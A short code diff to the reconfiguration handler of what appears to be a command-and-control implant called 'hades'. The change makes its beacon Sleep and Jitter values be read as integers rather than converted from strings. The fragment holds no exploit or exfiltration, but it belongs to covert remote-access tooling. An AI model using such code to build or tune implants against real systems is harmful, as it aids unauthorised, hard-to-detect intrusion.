@@ -85,17 +85,8 @@ void commanders::do_reconfig() {
 
 	g_ByteMgr->BeginTask();
 
-
-	// messed up early with DB schema
-	// to lazy to fix server side so for now just convert from str to int, ill fix later(probably never)
-	UINT SleepLen = g_ByteMgr->Read4();
-	PCHAR s = g_ByteMgr->ReadString(SleepLen);
-	UINT JitterLen = g_ByteMgr->Read4();
-	PCHAR j = g_ByteMgr->ReadString(JitterLen);
-
-
-	hades->config->Sleep = IntFromStr(s);
-	hades->config->Jitter = IntFromStr(j);
+	hades->config->Sleep = g_ByteMgr->Read4();
+	hades->config->Jitter = g_ByteMgr->Read4();
 
 	g_ByteMgr->EndOk(RECONFIG_DONE);
 }
